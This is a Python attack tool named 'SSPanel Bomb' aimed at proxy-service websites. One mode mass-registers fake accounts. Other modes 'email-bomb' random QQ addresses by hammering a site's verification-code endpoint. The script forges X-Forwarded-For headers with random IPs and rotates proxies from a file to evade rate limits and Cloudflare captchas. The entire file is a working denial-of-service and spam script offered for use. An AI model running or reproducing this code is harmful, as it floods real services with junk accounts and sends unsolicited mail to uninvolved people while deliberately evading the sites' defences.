# -*- coding: utf-8 -*-
import os
import sys 
import platform
import time
import json
import requests
import random
import string

#设置工作模式：
#1. 批量注册（适用于毫无防备，注册不需要邮件验证的）
#2. 刷邮件-标准模式（循环向随机QQ邮箱发送注册验证码）
#3. 刷邮件-代理模式（适用于上面标准模式不可用的机场，需要将http/s代理写入同目录下的ip.txt）
#4. 节点密码修改接口压测（咕咕咕）
mode = 1
#请求超时时间(s)
posttimeout = 5
#请求延迟时间(s)
delay = 2
#轮训模式开关(代理ip模式)
loopmode = False
#单ip请求失败次数上限(代理ip模式)
faillimit = 5
#设置目标url与header参数
#Example：https://xxxxx.com/api/v1/passport/auth/register、https://xxxxx.com/auth/register(批量注册)
#Example：https://xxxxx.com/auth/send(刷邮件)
#注：不同主题实现接口可能会有不同！
url = 'https://xxxxxx.com/auth/register'
header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Referer": "https://xxxxxx.com/auth/register",
    "Cookie": "",
    "Connection": "close"
}

#处理代理ip文件
def getProxy():
    proxylist = []
    with open("ip.txt", "r") as f:
        for line in f.readlines():
            line = line.strip('\n')
            proxylist.append(line)
    return proxylist

#生成随机邮箱数字
def randomMail():
    seed = "1234567890"
    sa = []
    for i in range(random.randint(5,10)):
        sa.append(random.choice(seed))
    salt = ''.join(sa)
    return salt

#生成随机ip
def randomIp():
    m=random.randint(0,255)
    n=random.randint(0,255)
    x=random.randint(0,255)
    y=random.randint(0,255)
    ip = str(m)+"."+str(n)+"."+str(x)+"."+str(y)
    return ip

#刷用户
def regBomb():
    count = 0
    requests.adapters.DEFAULT_RETRIES = 5
    while True:
        #随机密码
        userpass = "".join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a','Z','Y','X','W','V','U','T','S','R','Q','P','O','N','M','L','K','J','I','H','G','F','E','D','C','B','A','0','1','2','3','4','5','6','7','8','9','!','@','#','$','%','^','&','*',',','.','/'], 10))
        data = {'email':'%s@qq.com'%(randomMail()), 'passwd': userpass, 'repasswd': userpass}
        #伪造源ip
        header['X-Forwarded-For'] = randomIp()
        #发送请求
        try:
            r=requests.post(url, data=data, headers=header, timeout=posttimeout)
        except (requests.Timeout, requests.ConnectTimeout, requests.exceptions.ConnectionError):
            print("[X]请求失败或超时！")
            time.sleep(delay)
        else:
            count+=1
            rmessage = r.text.encode('utf-8').decode("unicode_escape")
            print("===============================")
            print("注册次数：%d " %(count))
            print("请求数据：%s " %(data))
            print("http状态码: %d" %(r.status_code))
            print("返回信息: %s" %(rmessage))
            print("===============================")
            #cloudflare
            if rmessage.find("captcha")!=-1:
                print("[!]触发了cf验证码，修改Cookie参数或等待一段时间再试！")
            time.sleep(delay)

#刷邮件-标准
def mailPost_fakeip():
    count = 0
    requests.adapters.DEFAULT_RETRIES = 5
    while True:
        data = {'email':'%s@qq.com'%(randomMail())}
        #伪造源ip
        header['X-Forwarded-For'] = randomIp()
        #发送请求
        try:
            r=requests.post(url, data=data, headers=header, timeout=posttimeout)
        except (requests.Timeout, requests.ConnectTimeout, requests.exceptions.ConnectionError):
            print("[X]请求失败或超时！")
            time.sleep(delay)
        else:
            count+=1
            rmessage = r.text.encode('utf-8').decode("unicode_escape")
            print("===============================")
            print("发送次数：%d " %(count))
            print("随机邮箱：%s " %(data))
            print("http状态码: %d" %(r.status_code))
            print("返回信息: %s" %(rmessage))
            print("===============================")
            #cloudflare
            if rmessage.find("captcha")!=-1:
                print("[!]触发了cf验证码，修改Cookie参数、等待一段时间再试或使用代理ip模式！")
            time.sleep(delay)

#刷邮件-代理
def mailPost_proxyip():
    count = 0
    proxystate = True
    requests.adapters.DEFAULT_RETRIES = 5
    if (os.path.exists('ip.txt')):
        proxylist = getProxy()
        print("[!]ip.txt中的代理数量: %d"%(len(proxylist)))
    else:
        print("[X]未找到 ip.txt 文件，请手工在本目录创建一个并填入代理ip！")
        sys.exit()
    for index in range(len(proxylist)):
        print("[!]使用的代理ip: %s"%(proxylist[index]))
        proxystate = True
        timeout = 0
        while proxystate:
            data = {'email':'%s@qq.com'%(randomMail())}
            #使用代理
            proxies = {'https': 'https://%s'%(proxylist[index]), 'http': 'http://%s'%(proxylist[index])}
            #发送请求
            try:
                r=requests.post(url, proxies=proxies, data=data, headers=header, timeout=posttimeout)
            except (requests.Timeout, requests.ConnectTimeout, requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
                print("[X]请求失败或超时！")
                timeout+=1
                if (timeout >= faillimit):
                    print("[!]当前代理ip失败次数过多，切换下一个……")
                    proxystate = False
                time.sleep(delay)
            else:
                count+=1
                timeout=0
                rmessage = r.text.encode('utf-8').decode("unicode_escape")
                print("===============================")
                print("发送次数：%d " %(count))
                print("随机邮箱：%s " %(data))
                print("http状态码: %d" %(r.status_code))
                print("返回信息: %s" %(rmessage))
                print("===============================")
                #判断上限
                if rmessage.find("次数过多")!=-1:
                    print("[!]当前ip已达请求上限，切换下一个代理……")
                    proxystate = False
                #cloudflare
                if rmessage.find("captcha")!=-1:
                    print("[!]当前ip触发了cf验证码，切换下一个代理……")
                    proxystate = False
                time.sleep(delay)

def start():
    if mode == 1:
        print("[!]批量注册模式")
        regBomb()
    elif mode == 2:
        print("[!]邮件轰炸-标准模式")
        mailPost_fakeip()
    elif mode == 3:
        print("[!]邮件轰炸-代理模式")
        if loopmode:
            print("[!]代理列表轮训模式：true")
            while(True):
                mailPost_proxyip()
        else:
            print("[!]代理列表轮训模式：false")
            mailPost_proxyip()
            print("[√]所有代理ip已使用完毕！")


if __name__ == "__main__":

    print("""   _____ _____ _____                 _ 
  / ____/ ____|  __ \               | |
 | (___| (___ | |__) |_ _ _ __   ___| |
  \___ \\___ \|  ___/ _` | '_ \ / _ \ |
  ____) |___) | |  | (_| | | | |  __/ |
 |_____/_____/|_|   \__,_|_| |_|\___|_|
 |  _ \                | |             
 | |_) | ___  _ __ ___ | |__           
 |  _ < / _ \| '_ ` _ \| '_ \          
 | |_) | (_) | | | | | | |_) |         
 |____/ \___/|_| |_| |_|_.__/          
                                       """)
    print("*******************************")
    print("Author        : CirnoSalt")
    print("Version       : 2.0")
    print("*******************************")
    print("现已支持的模式：")
    print("1. 批量注册")
    print("1. 邮件轰炸 - 标准")
    print("2. 邮件轰炸 - 代理")
    print("可在脚本内修改工作模式！")
    print("*******************************")
    print("已设置目标: %s \n"%(url))
    if(platform.system()=='Windows'):
        os.system('pause')
    elif(platform.system()=='Linux'):
        print("将在 5 秒后自动开火...")
        time.sleep(5)
    start()